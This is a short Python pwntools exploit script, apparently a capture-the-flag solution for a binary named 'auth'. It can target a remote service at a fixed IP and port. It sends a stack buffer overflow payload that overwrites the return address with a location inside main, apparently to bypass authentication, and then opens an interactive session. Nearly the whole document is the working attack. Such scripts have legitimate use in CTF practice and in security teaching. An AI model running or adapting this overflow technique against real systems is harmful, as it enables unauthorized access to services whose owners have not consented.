#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./auth"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("10.10.10.15", 1001)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+342
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


payload = b"A" * 0x8 * 7
payload += p64(elf.symbols["main"] + 298)

p.recvuntil(":")
p.sendline(payload)
p.recvuntil(":")
p.sendline(b'')

p.interactive()
